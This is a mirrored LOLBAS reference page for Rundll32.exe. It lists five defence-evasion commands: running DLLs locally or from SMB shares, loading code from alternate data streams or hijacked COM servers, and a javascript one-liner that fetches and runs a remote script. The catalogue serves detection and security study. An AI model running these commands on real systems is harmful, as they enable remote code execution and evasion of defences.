# LOLBAS: Rundll32.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Execute`

Used by Windows to execute dll files

## Comandos

### Execute DLL file

Execute · priv: User · T1218.011

```cmd
rundll32.exe {PATH},EntryPoint
```

First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.

### Execute DLL from SMB share.

Execute · priv: User · T1218.011

```cmd
rundll32.exe {PATH_SMB:.dll},EntryPoint
```

Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.

### Execute code from Internet

Execute · priv: User · T1218.011

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
```

Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.

### Execute code from alternate data stream

ADS · priv: User · T1564.004

```cmd
rundll32 "{PATH}:ADSDLL.dll",DllMain
```

Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).

### Execute a DLL/EXE COM server payload or ScriptletURL code.

Execute · priv: User · T1218.011

```cmd
rundll32.exe -sta {CLSID}
```

Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.

